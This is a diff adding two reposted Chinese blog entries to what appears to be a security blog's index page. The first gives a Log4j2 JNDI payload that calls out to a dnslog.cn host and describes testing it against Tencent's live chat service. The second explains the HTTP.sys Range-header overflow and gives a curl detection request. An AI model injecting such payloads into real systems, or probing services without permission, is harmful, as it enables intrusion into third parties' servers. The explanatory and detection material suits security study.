@@ -86,6 +86,117 @@
 
     
         <h2 class="title">
+            <a href="/2022/08/03/dnslog-log4j2/">
+                dnslog-log4j2
+            </a>
+        </h2>
+    
+    <time>
+        Aug 3, 2022
+    </time>
+    <section class="content">
+        <h1><span id="dnslog简单验证log4j2漏洞">dnslog简单验证log4j2漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://xingye.me/?p=444">星夜</a></p>
+</blockquote>
+<h2><span id="简单步骤">简单步骤</span></h2><blockquote>
+<p>进dnslog：<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
+<p>Get SubDomain 得到一个随机的子域名</p>
+<p>拼进${jndi:ldap:&#x2F;&#x2F;xxxxx.dnslog.cn&#x2F;exp}</p>
+<p>往任意可能在log中塞的输入填</p>
+<p>这里拿tx玩，如群中发送，可得到tx云的记录</p>
+<p><img src="/2022/08/03/dnslog-log4j2/1.png" alt="image"></p>
+<p><img src="/2022/08/03/dnslog-log4j2/2.png" alt="image"></p>
+<p><img src="/2022/08/03/dnslog-log4j2/3.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Log4j2/" rel="tag">Log4j2</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/03/HTTP.sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+                HTTP.sys远程代码执行
+            </a>
+        </h2>
+    
+    <time>
+        Aug 3, 2022
+    </time>
+    <section class="content">
+        <h1><span id="渗透整理httpsys远程代码执行">【渗透整理】HTTP.sys远程代码执行</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42742658/article/details/106548456">久违 °</a></p>
+</blockquote>
+<h2><span id="漏洞介绍">漏洞介绍</span></h2><blockquote>
+<p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞，当攻击者向受影响的Windows系统发送特殊设计的HTTP 请求，HTTP.sys 未正确分析时就会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p>
+<p>影响环境：Windows+IIS的环境下，任何安装了微软IIS 6.0以上的Windows Server 2008 R2&#x2F;Server 2012&#x2F;Server 2012 R2以及Windows 7&#x2F;8&#x2F;8.1操作系统都受到这个漏洞的影响。</p>
+</blockquote>
+<h2><span id="漏洞知识">漏洞知识</span></h2><blockquote>
+<p>说到HTTP.sys远程代码执行漏洞，不得不先介绍一下Range首部字段。</p>
+<p>在“上古时代”，网络并不是很好，下载大型文件很不容易。下载途中如果网络中断，就得重头开始下。为了解决这个问题，HTTP&#x2F;1.1引入了范围请求。</p>
+<p>在请求报文的Range首部字段中指定资源的byte范围，告诉服务器，请求的是资源哪个范围的内容，让断点续传和并行下载得以实现。</p>
+<p>如果服务器支持范围请求，响应包中就会存在Accept-Ranges字段(且值不为“none”，bytes为资源范围的单位)，并在Content-Length字段中告诉客户端资源的大小范围。</p>
+<p><img src="/2022/08/03/HTTP.sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.png" alt="image"></p>
+<p>如果没有Accept-Ranges字段，则服务器可能不支持范围请求，有的服务器会明确将值设为“none”。</p>
+<p>服务器面对范围请求，有三种响应：</p>
+<p>请求成功：</p>
+<p>响应206Partial Content请求范围越界：（范围超过资源的大小）</p>
+<p>响应416Requested Range Not Satisfiable不支持范围请求：</p>
+<p>响应200OK</p>
+<p>而HTTP.sys远程代码执行漏洞正是利用Range字段注入恶意数据。该漏洞的检测，也是利用服务器面对范围请求时的响应特征来判断。</p>
+</blockquote>
+<h2><span id="漏洞检测方法">漏洞检测方法</span></h2><blockquote>
+<p>1、先判断目标环境是否为Windows+IIS</p>
+<p>2、然后构建Range字段进行检测即可</p>
+<p>检测时，在请求包中添加Range字段，如下：</p>
+<p><code>Range: bytes=0-18446744073709551615</code></p>
+<p>【18446744073709551615的十六进制为0xFFFFFFFFFFFFFFFF(16个F)是64位无符号整数所能表达的最大整数，整数溢出和这个超大整数有关】</p>
+<p>然后go给服务器</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: stuff</span><br><span class="line">Range: <span class="built_in">bytes</span>=<span class="number">0</span>-<span class="number">18446744073709551615</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>或者：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v www.test.com -H <span class="string">&quot;Host: irrelevant&quot;</span> -H <span class="string">&quot;Range: bytes=0-18446744073709551615&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>服务器响应 400，证明不存在HTTP.sys远程代码执行漏洞</p>
+<p><code>HTTP Error 400. The request has an invalid header name.</code></p>
+<p>服务器响应 416，则证明存在该漏洞</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">416</span> Requested Range Not Satisfiable</span><br><span class="line">Content-<span class="type">Type</span>: text/html</span><br><span class="line">Last-Modified: Thu, <span class="number">22</span> Aug <span class="number">2013</span> <span class="number">23</span>:<span class="number">53</span>:<span class="number">12</span> GMT</span><br><span class="line">Accept-Ranges: <span class="built_in">bytes</span></span><br><span class="line">ETag: <span class="string">&quot;2edebc2929fce1:0&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="漏洞修复建议">漏洞修复建议：</span></h2><blockquote>
+<p>升级安全补丁</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/03/CVE-2022-25845-Fastjson/">
                 CVE-2022-25845 – Fastjson
             </a>
